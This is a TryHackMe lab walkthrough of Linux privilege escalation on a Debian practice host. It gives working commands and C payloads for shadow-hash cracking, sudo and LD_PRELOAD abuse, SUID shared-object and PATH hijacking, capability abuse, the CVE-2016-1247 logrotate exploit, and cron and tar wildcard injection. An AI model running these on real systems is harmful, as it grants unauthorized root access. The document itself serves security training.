# Walkthrough : TryHackMe - Linux PrivEsc Arena
## Linux Privilege Escalation - Technical Documentation
Target OS: Debian GNU/Linux
Target User Context: ```TCM``` / ```www-data``` $\rightarrow$ ```root```
Scope: Laboratory & CTF Demonstration

## 1. Information Gathering & Credential Recovery

1.1 Shadow Hash Extraction & Cracking
- Vulnerability: Readable ```/etc/shadow``` file contents.
- Mechanism: Combined standard account details from ```/etc/passwd``` with encrypted password hashes from ```/etc/shadow``` into a single file structure using ```unshadow```, followed by wordlist brute-forcing with John the Ripper.
- Commands:
```bash
unshadow /etc/passwd /etc/shadow > unshadowed.txt
john --wordlist=/usr/share/wordlists/rockyou.txt unshadowed.txt
```
- Result: Recovered ```root``` password: ```password123```.

1.2 SSH Private Key Identification
- Vulnerability: Sensitive plain-text credentials stored in accessible locations.
- Mechanism: Discovered an unencrypted SSH private key at ```/backups/supersecretkeys/id_rsa``` and copied it to the local attacker system.
- Commands:
```bash
chmod 600 id_rsa
ssh -o HostKeyAlgorithms=+ssh-rsa -i id_rsa root@10.48.147.215
```
- Result: Direct SSH administrative access gained.

## 2. Exploitation of Sudo Misconfigurations

2.1 GTFOBins Privilege Escalation (```sudo vim```)
- Vulnerability: ```NOPASSWD``` sudo permission granted for executable binaries.
- Mechanism: Executed built-in shell escape functionality within ```vim``` under elevated privileges.
- Command:
```bash
sudo vim -c '!sh'
```
Result: Interactive ```root``` shell spawned.

2.2 Shared Library Injection via LD_PRELOAD
- Vulnerability: ```env_keep += LD_PRELOAD``` directive enabled in ```/etc/sudoers```.
- Mechanism: Compiled a custom dynamic C library designed to overwrite user/group IDs and spawn ```/bin/bash``` prior to target program execution.
- Payload (```x.c```):
```bash
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
```
- Execution:
```bash
gcc -fPIC -shared -o /tmp/x.so x.c -nostartfiles
sudo LD_PRELOAD=/tmp/x.so apache2
```
- Result: ```root``` access obtained.

## 3. SUID & Binary Exploitation Vectors
3.1 Dynamic Shared Object Injection (suid-so)
- Vulnerability: SUID binary loading shared objects from user-writable directories without absolute path validation.
- Mechanism: Created a dynamic library defining a constructor function to set SUID bits on ```/tmp/bash```.
- Payload (```libcalc.c```):
```bash
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject() {
    system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash");
}
```
- Execution:
```bash
mkdir -p /home/user/.config
gcc -shared -o /home/user/.config/libcalc.so -fPIC libcalc.c
/usr/local/bin/suid-so
/tmp/bash -p
```
- Result: Escalated SUID shell (```euid=0(root)```).

3.2 PATH Environment Variable Hijacking (```suid-env```)
- Vulnerability: SUID binary invoking external commands using relative paths.
- Mechanism: Inspected strings within ```/usr/local/bin/suid-env``` to find references to ```service apache2 start```. Created a binary named ```service``` in ```/tmp``` and prepended ```/tmp``` to ```$PATH```.
- Commands:
```bash
echo 'int main() { setgid(0); setuid(0); system("/bin/bash"); return 0; }' > /tmp/service.c
gcc /tmp/service.c -o /tmp/service
export PATH=/tmp:$PATH
/usr/local/bin/suid-env
```
- Result: Executed payload with administrative rights.

3.3 Bash Function Abuse (```suid-env2```)
- Vulnerability: Older Bash versions permitting environment function exports to override system binary names.
- Mechanism: Exported a custom function matching the target service call inside ```/usr/local/bin/suid-env2```.
- Commands:
```bash
function /usr/sbin/service { cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p; }
export -f /usr/sbin/service
/usr/local/bin/suid-env2
```
- Result: Privileged shell spawned directly upon execution.

## 4. Kernel, Process & Capability Vulnerabilities
4.1 Linux Capabilities Manipulation
- Vulnerability: Excessive Linux capabilities assigned to binary utilities (```cap_setuid+ep```).
- Mechanism: Identified ```python2.6``` set with ```cap_setuid``` permissions via ```getcap```, allowing in-process UID modification to 0.
- Commands:
```bash
getcap -r / 2>/dev/null
/usr/bin/python2.6 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```
- Result: Effective UID set to 0 (```root```).

4.2 Nginx Logrotate Exploitation (CVE-2016-1247)
- Vulnerability: Nginx log file handling vulnerability combined with ```logrotate``` execution under ```cron.daily```.
- Mechanism: Replaced writable Nginx log file ```/var/log/nginx/error.log``` with a symbolic link to ```/etc/ld.so.preload``` to inject malicious shared libraries when ```logrotate``` restarts Nginx.
- Execution:
```bash
./nginxed-root.sh /var/log/nginx/error.log
/tmp/nginxrootsh
```
- Result: Obtained elevated SUID root shell payload execution.

## 5. Cron Job Abuse
5.1 Direct File Overwrite in Scheduled Tasks
- Vulnerability: Scheduled root cron job executing a shell script located in a user-writable path (```/home/user/overwrite.sh``` or ```/usr/local/bin/overwrite.sh```).
- Mechanism: Appended local shell copy commands directly into the target execution script.
- Commands:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
chmod +x /home/user/overwrite.sh
# Wait for cron execution
/tmp/bash -p
```
- Result: Root SUID bash binary created in ```/tmp```.

5.2 Wildcard Expansion Exploitation (tar)
- Vulnerability: Cron job executing ```tar czf /tmp/backup.tar.gz *``` within a directory containing user-controllable filenames.
- Mechanism: Created filenames matching ```tar``` command-line flags (```--checkpoint``` and ```--checkpoint-action```) to execute arbitrary commands upon glob expansion.
- Commands:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/runme.sh
touch /home/user/--checkpoint=1
touch '/home/user/--checkpoint-action=exec=sh runme.sh'
# Wait for cron execution
/tmp/bash -p
```
- Result: Arbitrary command execution triggered via ```tar``` argument injection.
## 6. Technical Summary
- Shadow Hash: Weak password and accessible system shadow file allow offline hash cracking using ```unshadow``` and ```john```.
- Sudo ```LD_PRELOAD```: Insecure ```sudoers``` directive allows preloading arbitrary shared libraries (```x.so```) to spawn a root shell.
- SUID Dynamic Lib: Missing relative path validation in SUID binaries allows execution of custom shared objects (```libcalc.so```).
- SUID Path Hijack: Unqualified binary execution within SUID utilities allows ```$PATH``` manipulation using custom malicious scripts (```/tmp/service```).
- Capabilities: Binary capabilities such as ```cap_setuid+ep``` on interpreters (```python2.6```) allow direct effective UID modification to 0.
- CVE-2016-1247: Insecure log file permissions allow logrotate symlink injection into ```/etc/ld.so.preload``` via ```nginxed-root.sh```.
- Cron Tar Wildcard: Unsafe usage of the ```*``` wildcard inside root scheduled tar commands permits argument injection via ```--checkpoint-action```.
